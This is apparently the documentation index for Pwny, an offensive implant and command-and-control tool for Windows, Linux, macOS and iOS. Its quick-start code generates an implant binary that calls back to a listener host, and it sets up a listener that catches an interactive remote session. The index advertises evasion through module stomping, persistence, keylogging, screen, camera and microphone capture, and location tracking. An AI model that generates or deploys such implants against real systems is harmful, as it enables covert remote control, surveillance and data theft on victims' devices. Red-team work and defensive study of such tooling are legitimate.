# Pwny Documentation

> *Friendly like a Pony, Mighty like a Knight*

Pwny is an advanced implant written in pure C, designed for portability and extensibility. It supports **Windows**, **Linux**, **macOS**, and **iOS** targets, and integrates tightly with the [HatSploit Framework](https://github.com/EntySec/HatSploit).

---

## Documentation Index

### General (All Platforms)

| Document | Description |
|----------|-------------|
| [Getting Started](getting-started.md) | Installation, deployment, and first session |
| [Console](console.md) | Interactive console features, environment, prompt customization |
| [Commands Reference](commands.md) | All cross-platform commands with usage and example output |
| [Plugin Development](plugin-development.md) | Writing, building, and loading custom plugins (TABs) |
| [Code-Only Tabs (COT)](cot.md) | Technical deep-dive into the COT evasion mechanism |
| [Building](building.md) | Compiling Pwny from source — dependencies, toolchains, CMake |

### Platform-Specific

| Platform | Document |
|----------|----------|
| Windows | [docs/windows/](windows/) — Windows commands, plugins (28), evasion, persistence |
| Linux | [docs/linux/](linux/) — Linux commands, migration, camera, microphone |
| macOS | [docs/macos/](macos/) — macOS commands, keylogging, screen capture, clipboard |
| iOS | [docs/ios/](ios/) — iOS commands, device info, location, SpringBoard |

---

## Quick Start

```bash
# Install via HatSploit (recommended)
pip3 install git+https://github.com/EntySec/HatSploit

# Or standalone
pip3 install git+https://github.com/EntySec/Pwny
```

Generate a payload, start a listener, and catch a session:

```python
from pwny import Pwny
from pwny.session import PwnySession

# Generate implant binary
pwny = Pwny(
    target='x86_64-w64-mingw32',
    options={'uri': 'tcp://192.168.1.10:8888'}
)
with open('implant.exe', 'wb') as f:
    f.write(pwny.to_binary())
```

```python
# Standalone TCP listener (examples/tcp_server.py)
import socket
from pwny.session import PwnySession

s = socket.socket()
s.bind(('0.0.0.0', 8888))
s.listen()
conn, addr = s.accept()

session = PwnySession()
session.info['Platform'] = 'windows'
session.info['Arch'] = 'x64'
session.open(conn)
session.interact()
```

Once connected, you'll see system information and the interactive prompt:

```
  Name: Windows 10 Pro
  Kernel: 10.0.19045
  Arch: x86_64
  Memory: 4.2 GB/16.0 GB
  Commands: 38
  Plugins: 0

pwny:/C/Users/target$ 
```

---

## Architecture

```
┌────────────────────────────────────────────────────────┐
│                    Operator Machine                     │
│                                                        │
│  HatSploit / Standalone Listener                       │
│  ┌──────────────────────────────────────────────────┐  │
│  │  PwnySession                                     │  │
│  │  ├── Console (Cmd)  ← commands, plugins, prompt  │  │
│  │  ├── Pipes          ← bidirectional streaming    │  │
│  │  ├── Plugins        ← TAB loader                 │  │
│  │  ├── TLV channel    ← encrypted binary protocol  │  │
│  │  └── Loot           ← collected artifacts        │  │
│  └──────────────────────────────────────────────────┘  │
└───────────────────────┬────────────────────────────────┘
                        │ TCP / HTTP / TLS
┌───────────────────────▼────────────────────────────────┐
│                    Target Machine                       │
│                                                        │
│  Pwny Implant (C)                                      │
│  ├── Core         ← event loop, TLV dispatch           │
│  ├── C2           ← TCP/HTTP client, reconnect logic   │
│  ├── Builtins     ← sysinfo, fs, process, network      │
│  ├── Crypto       ← AES-256-CBC / ChaCha20             │
│  └── TABs         ← dynamically loaded plugins         │
│      ├── DLL / ELF / Mach-O (legacy)                   │
│      └── COT blobs (module-stomped, Windows)            │
└────────────────────────────────────────────────────────┘
```

---

## Supported Platforms

| Platform | Architectures | Plugin Loading |
|----------|--------------|----------------|
| Windows | x64, x86 | COT (module stomping) + legacy DLL |
| Linux | x64, aarch64, armv5, i486, mips, mipsel, mips64, ppc, ppc64le, s390x | Pipe IPC (static-pie executables) |
| macOS | x86_64, aarch64 | Bundle / shared library |
| iOS | arm, aarch64 | Bundle |

---

## License

Pwny is released under the [MIT License](../LICENSE).

Copyright (c) 2020-2026 [EntySec](https://entysec.com)
